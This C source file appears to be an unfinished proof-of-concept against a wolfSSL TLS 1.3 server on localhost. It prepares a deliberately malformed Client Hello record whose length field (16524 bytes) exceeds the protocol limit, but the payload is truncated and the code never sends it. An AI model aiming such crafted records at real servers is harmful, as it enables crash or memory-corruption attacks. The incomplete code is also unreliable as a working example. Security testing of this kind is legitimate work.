#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/wolfcrypt/settings.h>

int main()
{
    WOLFSSL_CTX* ctx;
    WOLFSSL* ssl;
    
    wolfSSL_Init();
    
    ctx = wolfSSL_CTX_new(wolfTLSv1_3_client_method());
    if (!ctx) return -1;

    ssl = wolfSSL_new(ctx);
    if (!ssl) return -1;

    // 构造特制的 Client Hello 消息
    // 这里需要手动构造一个不完整的 TLS 记录层头部
    unsigned char client_hello[] = {
        0x16,       // Content Type: Handshake
        0x03, 0x03, // TLS Version
        0x40, 0x8c, // Length (16524 bytes)
        0x01,       // Handshake Type: Client Hello
        // ... 后续数据 ...
    };

    // 发送特制消息
    int sockfd;
    struct sockaddr_in servAddr;
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("Failed to create socket\n");
        return -1;
    }

    // Initialize server address struct
    memset(&servAddr, 0, sizeof(servAddr));
    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(4433); // WolfSSL server port
    servAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Connect to localhost

    // Connect to server
    if (connect(sockfd, (struct sockaddr*)&servAddr, sizeof(servAddr)) < 0) {
        printf("Failed to connect to server\n");
        close(sockfd);
        return -1;
    }

    // Attach socket to wolfSSL
    if (wolfSSL_set_fd(ssl, sockfd) != WOLFSSL_SUCCESS) {
        printf("Failed to set wolfSSL file descriptor\n");
        close(sockfd);
        return -1;
    }

    // 清理
    wolfSSL_free(ssl);
    wolfSSL_CTX_free(ctx);
    wolfSSL_Cleanup();
    
    return 0;
}